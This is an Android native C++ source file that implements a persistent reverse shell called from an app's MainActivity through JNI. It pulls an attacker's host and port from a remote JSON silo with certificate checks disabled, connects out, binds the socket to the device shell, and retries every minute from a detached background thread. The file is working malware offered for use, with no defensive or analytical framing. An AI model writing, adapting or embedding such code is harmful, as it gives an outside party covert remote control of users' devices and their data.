#include <jni.h>
#include <string>
#include <vector>
#include <curl/curl.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <fcntl.h>
#include <poll.h>
#include <errno.h>
#include <pthread.h>
#include <sys/wait.h>
#include <termios.h>
#include <signal.h>

#include <android/log.h>

#define LOG_TAG "ReverseShell"
#define LOGI(...) __android_log_print(ANDROID_LOG_INFO, LOG_TAG, __VA_ARGS__)
#define LOGE(...) __android_log_print(ANDROID_LOG_ERROR, LOG_TAG, __VA_ARGS__)

struct MemoryStruct {
    char *memory;
    size_t size;
};

static size_t WriteMemoryCallback(void *contents, size_t size, size_t nmemb, void *userp) {
    size_t realsize = size * nmemb;
    struct MemoryStruct *mem = (struct MemoryStruct *)userp;
    
    char *ptr = (char*)realloc(mem->memory, mem->size + realsize + 1);
    if (!ptr) {
        LOGE("Not enough memory (realloc returned NULL)");
        return 0;
    }
    
    mem->memory = ptr;
    memcpy(&(mem->memory[mem->size]), contents, realsize);
    mem->size += realsize;
    mem->memory[mem->size] = 0;
    
    return realsize;
}

std::pair<std::string, int> get_server_info() {
    CURL *curl;
    CURLcode res;
    struct MemoryStruct chunk;
    
    chunk.memory = (char*)malloc(1);
    chunk.size = 0;
    
    curl = curl_easy_init();
    if (curl) {
        curl_easy_setopt(curl, CURLOPT_URL, "https://console.jsonsilo.com/silos/editor/3be60038-0dbc-4604-a3c1-3c60ed3313cb?region=api");
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteMemoryCallback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, (void *)&chunk);
        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
        curl_easy_setopt(curl, CURLOPT_TIMEOUT, 10L);
        curl_easy_setopt(curl, CURLOPT_USERAGENT, "Mozilla/5.0");
        
        res = curl_easy_perform(curl);
        if (res != CURLE_OK) {
            LOGE("curl_easy_perform() failed: %s", curl_easy_strerror(res));
        }
        
        curl_easy_cleanup(curl);
    }
    
    std::string host;
    int port = 443;
    
    if (chunk.size > 0) {
        std::string response(chunk.memory);
        free(chunk.memory);
        
        // Parse simple JSON response - expect {"host":"x.x.x.x","port":1234}
        size_t host_pos = response.find("\"host\":\"");
        if (host_pos != std::string::npos) {
            host_pos += 8;
            size_t host_end = response.find("\"", host_pos);
            if (host_end != std::string::npos) {
                host = response.substr(host_pos, host_end - host_pos);
            }
        }
        
        size_t port_pos = response.find("\"port\":");
        if (port_pos != std::string::npos) {
            port_pos += 7;
            size_t port_end = response.find(",", port_pos);
            if (port_end == std::string::npos) {
                port_end = response.find("}", port_pos);
            }
            if (port_end != std::string::npos) {
                std::string port_str = response.substr(port_pos, port_end - port_pos);
                port = std::stoi(port_str);
            }
        }
    }
    
    LOGI("Server: %s:%d", host.c_str(), port);
    return {host, port};
}

int create_socket(const std::string& host, int port) {
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        return -1;
    }
    
    struct sockaddr_in server_addr;
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(port);
    inet_pton(AF_INET, host.c_str(), &server_addr.sin_addr);
    
    // Set non-blocking
    int flags = fcntl(sock, F_GETFL, 0);
    fcntl(sock, F_SETFL, flags | O_NONBLOCK);
    
    if (connect(sock, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
        if (errno != EINPROGRESS) {
            close(sock);
            return -1;
        }
    }
    
    // Wait for connection (non-blocking connect completion)
    struct pollfd pfd;
    pfd.fd = sock;
    pfd.events = POLLOUT;
    
    if (poll(&pfd, 1, 5000) > 0 && (pfd.revents & POLLOUT)) {
        int error = 0;
        socklen_t len = sizeof(error);
        getsockopt(sock, SOL_SOCKET, SO_ERROR, &error, &len);
        if (error == 0) {
            fcntl(sock, F_SETFL, flags); // Set back to blocking
            return sock;
        }
    }
    
    close(sock);
    return -1;
}

void handle_shell(int sock) {
    LOGI("Shell connected successfully");
    
    // Dup socket to stdin/stdout/stderr
    dup2(sock, 0);
    dup2(sock, 1);
    dup2(sock, 2);
    
    // Execute shell
    execl("/system/bin/sh", "sh", NULL);
    // Fallback for some devices
    execl("/bin/sh", "sh", NULL);
}

void* shell_thread(void* arg) {
    while (true) {
        auto [host, port] = get_server_info();
        if (host.empty()) {
            LOGE("Failed to get server info, retrying...");
            sleep(60);
            continue;
        }
        
        int sock = create_socket(host, port);
        if (sock >= 0) {
            handle_shell(sock);
        } else {
            LOGE("Connection failed to %s:%d, retrying in 60s...", host.c_str(), port);
        }
        
        sleep(60); // Wait 1 minute before retry
    }
    return NULL;
}

extern "C" JNIEXPORT void JNICALL
Java_com_example_yourapp_MainActivity_startReverseShell(JNIEnv *env, jobject thiz) {
    // Initialize curl
    curl_global_init(CURL_GLOBAL_DEFAULT);
    
    pthread_t thread;
    pthread_create(&thread, NULL, shell_thread, NULL);
    pthread_detach(thread);
}
